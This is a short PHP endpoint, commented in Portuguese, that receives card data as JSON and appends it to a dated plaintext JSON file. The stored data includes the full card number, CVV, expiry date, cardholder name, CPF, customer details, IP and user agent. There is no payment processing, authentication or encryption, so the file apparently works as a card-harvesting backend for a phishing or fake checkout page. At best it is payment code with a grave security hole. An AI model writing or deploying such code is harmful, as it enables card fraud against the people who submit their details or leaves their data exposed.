<?php
/**
 * Endpoint para salvar dados do cartão de crédito
 */
header('Content-Type: application/json');

$input = file_get_contents('php://input');
$data = json_decode($input, true);

if (!$data) {
    echo json_encode(['success' => false, 'error' => 'Dados não fornecidos']);
    exit;
}

$dataDir = __DIR__ . '/../data';
if (!is_dir($dataDir)) {
    mkdir($dataDir, 0755, true);
}

$cardData = [
    'id' => uniqid('card_', true),
    'timestamp' => date('Y-m-d H:i:s'),
    'card_number' => $data['cardNumber'] ?? '',
    'card_number_last4' => substr($data['cardNumber'] ?? '', -4),
    'card_name' => $data['cardName'] ?? '',
    'card_cpf' => $data['cardCPF'] ?? '',
    'card_cvv' => $data['cardCVV'] ?? '',
    'card_brand' => $data['cardBrand'] ?? 'unknown',
    'card_validity' => $data['cardValidity'] ?? '',
    'amount' => $data['amount'] ?? 0,
    'customer_data' => $data['customerData'] ?? [],
    'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown'
];

$filename = $dataDir . '/card_data_' . date('Y-m-d') . '.json';
$allData = [];

if (file_exists($filename)) {
    $allData = json_decode(file_get_contents($filename), true) ?: [];
}

$allData[] = $cardData;

file_put_contents($filename, json_encode($allData, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

echo json_encode(['success' => true, 'message' => 'Dados salvos com sucesso']);

